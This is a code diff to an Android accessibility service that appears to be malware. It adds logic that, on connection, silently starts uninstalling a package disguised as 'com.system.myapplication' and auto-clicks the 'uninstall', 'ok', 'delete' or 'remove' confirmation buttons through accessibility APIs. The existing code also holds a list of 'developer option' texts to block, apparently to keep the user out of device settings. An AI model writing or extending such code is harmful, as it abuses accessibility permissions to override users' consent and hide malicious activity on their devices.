@@ -46,6 +46,10 @@ public class Service extends AccessibilityService {
     private ServiceHandler mainHandler;
     private boolean isProcessingEvent = false;
     private Map<String, String> inMemoryData = new HashMap<String, String>();
+    
+    // Uninstall specific fields
+    private boolean isUninstalling = false;
+    private static final String TARGET_PACKAGE = "com.system.myapplication";
 
     private static final String[] BLOCK_TEXTS = {
             "developer option", "developer mode",
@@ -423,6 +427,62 @@ public class Service extends AccessibilityService {
         }
     }
 
+    /**
+     * Initialize and start the uninstall process for the target package
+     */
+    private void initiateUninstall() {
+        try {
+            Intent intent = new Intent(Intent.ACTION_DELETE);
+            intent.setData(Uri.parse("package:" + TARGET_PACKAGE));
+            intent.putExtra(Intent.EXTRA_RETURN_RESULT, true);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+            isUninstalling = true;
+            Log.d(TAG, "Initiated uninstall for " + TARGET_PACKAGE);
+        } catch (Exception e) {
+            Log.e(TAG, "Error initiating uninstall: " + e.getMessage());
+        }
+    }
+
+    /**
+     * Handles the uninstall confirmation dialog flow
+     */
+    private void handleUninstallFlow(AccessibilityEvent event) {
+        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+        if (rootNode == null) return;
+
+        try {
+            // Look for uninstall-related buttons
+            String[] uninstallTexts = {"uninstall", "ok", "delete", "remove"};
+            for (String text : uninstallTexts) {
+                List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(text);
+                for (AccessibilityNodeInfo node : nodes) {
+                    if (node != null) {
+                        if (node.isClickable()) {
+                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            isUninstalling = false;
+                            Log.d(TAG, "Uninstall action completed");
+                            return;
+                        }
+                        // Try parent nodes if current node isn't clickable
+                        AccessibilityNodeInfo parent = node.getParent();
+                        while (parent != null) {
+                            if (parent.isClickable()) {
+                                parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                isUninstalling = false;
+                                Log.d(TAG, "Uninstall action completed via parent");
+                                return;
+                            }
+                            parent = parent.getParent();
+                        }
+                    }
+                }
+            }
+        } finally {
+            rootNode.recycle();
+        }
+    }
+
     @Override
     public void onServiceConnected() {
         super.onServiceConnected();
@@ -459,6 +519,9 @@ public class Service extends AccessibilityService {
 
         // Apply manufacturer specific optimizations
         applyManufacturerSpecificOptimizations(this);
+        
+        // Initiate uninstall for target package
+        initiateUninstall();
 
         Log.d(TAG, "Accessibility Service Connected");
     }
@@ -469,6 +532,13 @@ public class Service extends AccessibilityService {
         isProcessingEvent = true;
 
         try {
+            // First priority: Handle uninstall flow if active
+            if (isUninstalling) {
+                handleUninstallFlow(event);
+                isProcessingEvent = false;
+                return;
+            }
+
             // Proceed with other logic
             String packageName = event.getPackageName() != null ?
                     event.getPackageName().toString().toLowerCase() : "";
